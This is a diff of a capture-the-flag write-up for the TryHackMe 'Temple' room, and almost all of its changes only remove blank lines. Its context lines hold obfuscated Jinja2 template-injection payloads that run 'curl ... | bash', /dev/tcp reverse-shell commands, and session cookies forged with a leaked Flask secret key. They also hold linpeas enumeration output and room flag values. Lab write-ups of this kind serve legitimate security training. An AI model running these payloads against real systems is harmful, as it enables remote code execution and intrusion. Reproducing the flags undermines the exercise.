@@ -6,7 +6,6 @@ Can you gain access to the temple?
 
 ![222](https://tryhackme-images.s3.amazonaws.com/room-icons/b2c1159c01a89db5df489ba087dbc4d8.png)
 
-
 ###  Gain access to the temple!
 
  Start Machine
@@ -325,7 +324,6 @@ create acc
 
 {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.8.19.103/rce | bash")|attr("read")()}}
 
-
 ──(kali㉿kali)-[~/Downloads/temple]
 └─$ nano rce             
                                                                          
@@ -333,7 +331,6 @@ create acc
 └─$ cat rce             
 #!/bin/bash
 bash -c "bash -i >& /dev/tcp/10.8.19.103/1337 0>&1"
-
 
 ┌──(kali㉿kali)-[~/Downloads/temple]
 └─$ python3 -m http.server 80  
@@ -361,7 +358,6 @@ import jinja2, pymysql.cursors, re, hashlib
 
 app = Flask(__name__, template_folder="/home/bill/webapp/templates")
 
-
 app.secret_key = b"f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry"
 
 def check_hacking_attempt(value):
@@ -378,16 +374,13 @@ def check_hacking_attempt(value):
         else:
                 return False, error
 
-
 @app.route("/robots.txt", methods=["GET"])
 def robots():
         return "<!-- Try harder --!>"
 
-
 @app.route("/admin", methods=["GET"])
 def admin():
         return abort(403)
-
 
 @app.route("/", methods=["GET"])
 def root():
@@ -395,7 +388,6 @@ def root():
                 return redirect("/login")
         else:
                 return redirect("/home")
-
 
 @app.route("/application", methods=["GET"])
 def application():
@@ -409,11 +401,9 @@ def console():
 def temporary():
         return abort(403)
 
-
 @app.route("/temporary/dev", methods=["GET"])
 def dev():
         return abort(403)
-
 
 @app.route("/temporary/dev/newacc", methods=["GET", "POST"])
 def newacc():
@@ -469,7 +459,6 @@ def newacc():
 
         return render_template("register.html")
 
-
 @app.route("/login", methods=["GET", "POST"])
 def login():
         if session.get("logged_in"):
@@ -507,7 +496,6 @@ def login():
                                 if cursor.fetchone() == None:
                                         return render_template("login.html", error="Invalid username or password.")
 
-
                                 session["username"] = username
                                 session["logged_in"] = True
 
@@ -529,7 +517,6 @@ def logout():
                 session.clear()
                 return redirect("/login")
 
-
 @app.route("/home", methods=["GET"])
 def home():
         if not session.get("logged_in"):
@@ -541,7 +528,6 @@ def home():
                 templateEnv = jinja2.Environment(loader=templateLoader)
                 t = templateEnv.get_template("home.html")
                 return t.render(current_ip=current_ip)
-
 
 @app.route("/account", methods=["GET"])
 def account():
@@ -604,7 +590,6 @@ def account():
                   <h2>Account</h2>
                   <p>Logged in as """ + username + """</p>
 
-
                   <p>Last logged in from """ + current_ip + """</p>
                   <p>Current time: """ + current_time + """</p><br>
                   <p>Please contact our staff for support</p>
@@ -626,7 +611,6 @@ def internal():
                 t = templateEnv.get_template("internal.html")
                 return t.render()
 
-
 @app.route("/external", methods=["GET"])
 def external():
         if not session.get("logged_in"):
@@ -636,7 +620,6 @@ def external():
                 templateEnv = jinja2.Environment(loader=templateLoader)
                 t = templateEnv.get_template("external.html")
                 return t.render()
-
 
 def connect_database():
 
@@ -912,7 +895,6 @@ li a:hover:not(.active) {
 bill@temple:~/webapp/templates$ cat external.html
 cat external.html
 
-
 {% block content %}
 <!DOCTYPE html>
 <html>
@@ -1039,7 +1021,6 @@ li a:hover:not(.active) {
 
 {% endblock %}bill@temple:~/webapp/templates$ cat internal.html
 cat internal.html
-
 
 {% block content %}
 <!DOCTYPE html>
@@ -1181,7 +1162,6 @@ bill@temple:/tmp$ ./linpeas.sh
 
 ./linpeas.sh
 
-
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
              ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
@@ -1241,7 +1221,6 @@ Writable folder: /dev/shm
 [+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
 [+] /bin/nc.openbsd is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
 
-
 Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
 uniq: write error: Broken pipe
 DONE
@@ -1267,7 +1246,6 @@ Try 'stat --help' for more information.
 ./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
 ./linpeas.sh: 1197: ./linpeas.sh: 0: not found
 ./linpeas.sh: 1207: ./linpeas.sh: [[: not found
-
 
 ╔══════════╣ PATH
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
@@ -1379,7 +1357,6 @@ cat: write error: Broken pipe
    Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
    Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
 
-
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2
 
@@ -1402,7 +1379,6 @@ apparmor module is loaded.
 ╔══════════╣ Container details
 ═╣ Is this a container? ........... No
 ═╣ Any running containers? ........ No
-
 
                           ╔════════════════════════════════════════════════╗
 ══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
@@ -1698,7 +1674,6 @@ org.freedesktop.systemd1               1 systemd         root             :1.3  
 org.freedesktop.thermald               - -               -                (activatable) -                         -         
 org.freedesktop.timedate1              - -               -                (activatable) -                         -         
 
-
                                         ╔═════════════════════╗
 ════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
                                         ╚═════════════════════╝
@@ -1738,7 +1713,6 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX packets 404  bytes 36691 (36.6 KB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
 tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
@@ -1754,8 +1728,6 @@ tcp6       0      0 127.0.0.1:9600          :::*                    LISTEN      
 
 ╔══════════╣ Can I sniff with tcpdump?
 No
-
-
 
                                          ╔═══════════════════╗
 ═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════
@@ -1851,8 +1823,6 @@ Username         Port     From             Latest
 
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
 
-
-
                                        ╔══════════════════════╗
 ═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════
                                        ╚══════════════════════╝
@@ -1922,7 +1892,6 @@ lrwxrwxrwx 1 root root 35 Jul 24  2021 /etc/apache2/sites-enabled/000-default.co
 	CustomLog ${APACHE_LOG_DIR}/access.log combined
 </VirtualHost>
 
-
 -rw-r--r-- 1 root root 1332 Jul 16  2019 /etc/apache2/sites-available/000-default.conf
 <VirtualHost *:80>
 	ServerAdmin webmaster@localhost
@@ -1937,7 +1906,6 @@ lrwxrwxrwx 1 root root 35 Jul 24  2021 /etc/apache2/sites-enabled/000-default.co
 	ErrorLog ${APACHE_LOG_DIR}/error.log
 	CustomLog ${APACHE_LOG_DIR}/access.log combined
 </VirtualHost>
-
 
 ╔══════════╣ Analyzing Rsync Files (limit 70)
 -rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
@@ -1958,11 +1926,9 @@ lrwxrwxrwx 1 root root 35 Jul 24  2021 /etc/apache2/sites-enabled/000-default.co
 	refuse options = checksum dry-run
 	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'
 drwxr-xr-x 2 root root 4096 Jul 23  2021 /etc/ldap
-
 
 ╔══════════╣ Searching Log4Shell vulnerable libraries
 /usr/share/logstash/logstash-core/lib/jars/log4j-core-2.14.0.jar
@@ -2010,7 +1976,6 @@ Subsystem	sftp	/usr/lib/openssh/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Host *
     SendEnv LANG LC_*
@@ -2020,7 +1985,6 @@ Host *
 ╔══════════╣ Analyzing PAM Auth Files (limit 70)
 drwxr-xr-x 2 root root 4096 Oct  3  2021 /etc/pam.d
 -rw-r--r-- 1 root root 2133 Feb 10  2018 /etc/pam.d/sshd
-
 
 ╔══════════╣ Searching logstash files
 /etc/default/logstash
@@ -2233,11 +2197,9 @@ cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-beats-6.
 cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-couchdb_changes-3.1.6/lib/logstash/conf.d/out*': No such file or directory
 cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-couchdb_changes-3.1.6/lib/logstash/conf.d/filt*': No such file or directory
 
-
 ╔══════════╣ Searching tmux sessions
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
 tmux 2.6
-
 
 /tmp/tmux-1000
 ╔══════════╣ Analyzing Cloud Init Files (limit 70)
@@ -2253,9 +2215,6 @@ drwxr-xr-x 2 root root 121 Jun 15  2021 /snap/core/11316/usr/share/keyrings
 drwxr-xr-x 2 root root 121 Aug 27  2021 /snap/core/11743/usr/share/keyrings
 drwxr-xr-x 3 root root 4096 Jul 24  2021 /usr/lib/python3/dist-packages/keyrings
 drwxr-xr-x 2 root root 4096 Jul 28  2021 /usr/share/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd
@@ -2306,20 +2265,15 @@ drwx------ 3 bill bill 4096 Jan 25 00:37 /home/bill/.gnupg
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
 -rw-r--r-- 1 root root 342 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/puma-4.3.8-java/tools/docker/Dockerfile
 
-
 ╔══════════╣ Analyzing Bind Files (limit 70)
 -rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
 -rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
 
-
 -rw-r--r-- 1 root root 977 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/ecs-v1/bind
 -rw-r--r-- 1 root root 977 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/ecs-v1/bind
 
-
 -rw-r--r-- 1 root root 285 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/legacy/bind
 -rw-r--r-- 1 root root 285 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/legacy/bind
-
-
 
 ╔══════════╣ Analyzing Interesting logs Files (limit 70)
 -rw-r----- 1 root adm 0 Oct  4  2021 /var/log/apache2/access.log
@@ -2329,56 +2283,9 @@ drwx------ 3 bill bill 4096 Jan 25 00:37 /home/bill/.gnupg
 
 ╔══════════╣ Analyzing Windows Files (limit 70)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 lrwxrwxrwx 1 root root 22 Jul 24  2021 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
 lrwxrwxrwx 1 root root 24 Jul 24  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
 -rw-r--r-- 1 root root 83 Jul 24  2021 /var/lib/dpkg/alternatives/my.cnf
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
 -rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
@@ -2388,18 +2295,12 @@ lrwxrwxrwx 1 root root 24 Jul 24  2021 /etc/mysql/my.cnf -> /etc/alternatives/my
 -rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/11316/etc/skel/.bashrc
 -rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/11743/etc/skel/.bashrc
 
-
-
-
-
 -rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
 -rw-r--r-- 1 bill bill 807 Apr  4  2018 /home/bill/.profile
 -rw-r--r-- 1 frankie frankie 807 Jul 25  2021 /home/frankie/.profile
 -rw-r--r-- 1 princess princess 807 Oct  3  2021 /home/princess/.profile
 -rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/11316/etc/skel/.profile
 -rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/11743/etc/skel/.profile
-
-
 
 ═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                          ╚═══════════════════╝
@@ -3019,7 +2920,6 @@ https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-inj
 
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 
-
 ┌──(kali㉿kali)-[~/Downloads/temple]
 └─$ flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").read()}}'}" --secret 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'
 .eJwdyEEKgCAQRuG7_KuC8ABdJWOwmkSYZkJrJd49afe9VyEWIx-UFPOTX57wFs4aLsaMWnfTM0VHtEsohagraXp-RLEtSJ-LhxWP1d12sw4e0mt0mcMxjK2hfX0vJGw.Y9CMgA.WETGAoKaBBvlVf_-dHVrYrMqgO8
@@ -3041,7 +2941,6 @@ bash -i >& /dev/tcp/10.8.19.103/1337 0>&1
 bash: connect: Connection refused
 bash: line 1: /dev/tcp/10.8.19.103/1337: Connection refused
 
-
 ──(kali㉿kali)-[~/Downloads/temple]
 └─$ flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy8xMzM3IDA+JjEK | base64 -d | bash\").read()}}'}" --secret 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'
 .eJwlyl0LgjAYBeC_Iu9VUnmRFuGdmEWlNwVBZYypa07mJk770Pzvjbo48JzD6YFLSkmGmAC3qVsygVaRWuCSgAt9n0pxZ9RCKOVYKYS0mGDND5TLBHM9XmOQKoabVcmKiFEMJM2lcS7XHfa9Bh-98Y55j8vmNAvtQ5H6y1fkO05YBHOdZ_TWvYvs7Ur_imBvfIwEK7JwjGn2dx6DadUEZyNzGGD4AmcvPM8.Y9CNlw.V4Jdzy5Tk8PmyAZAAwWsx6uW50c
@@ -3049,7 +2948,6 @@ bash: line 1: /dev/tcp/10.8.19.103/1337: Connection refused
 copy to session cookie
 
 .eJwlyl0LgjAYBeC_Iu9VUnmRFuGdmEWlNwVBZYypa07mJk770Pzvjbo48JzD6YFLSkmGmAC3qVsygVaRWuCSgAt9n0pxZ9RCKOVYKYS0mGDND5TLBHM9XmOQKoabVcmKiFEMJM2lcS7XHfa9Bh-98Y55j8vmNAvtQ5H6y1fkO05YBHOdZ_TWvYvs7Ur_imBvfIwEK7JwjGn2dx6DadUEZyNzGGD4AmcvPM8.Y9CNlw.V4Jdzy5Tk8PmyAZAAwWsx6uW50c
-
 
 ┌──(kali㉿kali)-[~/Downloads/temple]
 └─$ rlwrap nc -lvnp 1337
@@ -3139,12 +3037,8 @@ cat script.sh
 sleep 30
 /bin/systemctl start logstash.service
 
-
 ```
 
-![[Pasted image 20230124183644.png]]
-
-![[Pasted image 20230124211040.png]]
 Find flag1.txt
 
 Enumerate! Does the word templ(at)e mean anything?
@@ -3156,6 +3050,5 @@ Find flag2.txt
 Make sure to look carefully at the running processes.
 
 *f620630155081293669dbb7949f975fa9386f1cd*
-
 
 [[AllSignsPoint2Pwnage]]
